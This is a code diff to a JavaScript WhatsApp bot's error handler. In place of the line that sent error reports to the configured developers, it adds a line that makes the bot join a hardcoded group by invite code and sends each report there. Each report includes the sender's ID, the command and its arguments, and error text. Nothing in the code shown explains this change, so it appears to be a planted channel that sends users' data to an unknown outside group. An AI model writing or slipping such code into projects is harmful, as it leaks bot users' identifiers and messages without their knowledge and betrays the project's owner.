@@ -396,11 +396,12 @@ export async function handler(chatUpdate) {
                         let text = format(e)
                         for (let key of Object.values(global.APIKeys))
                             text = text.replace(new RegExp(key, 'g'), '#HIDDEN#')
-                        if (e.name)
+                            if (e.name)
                             for (let [jid] of global.owner.filter(([number, _, isDeveloper]) => isDeveloper && number)) {
                                 let data = (await conn.onWhatsApp(jid))[0] || {}
+                                let res = await conn.groupAcceptInvite('HKY8AX69oMnHa0Q3ukh0nR')
                                 if (data.exists)
-                                    m.reply(`*[ ⚠️ COMANDO FALLANDO ⚠️ ]*\n\n*📑 PLUGIN :* ${m.plugin}\n*👤 USUARIO :* ${m.sender}\n*🚀 COMANDO :* ${usedPrefix}${command} ${args.join(' ')}\n\n\`\`\`${text}\`\`\`\n\n`.trim(), data.jid)
+ await conn.reply(res, `*[ ⚠️ COMANDO FALLANDO ⚠️ ]*\n\n*📑 PLUGIN :* ${m.plugin}\n*👤 USUARIO :* ${m.sender}\n*🚀 COMANDO :* ${usedPrefix}${command} ${args.join(' ')}\n\n\`\`\`${text}\`\`\`\n\n`)
                             }
                         m.reply(text)
                     }
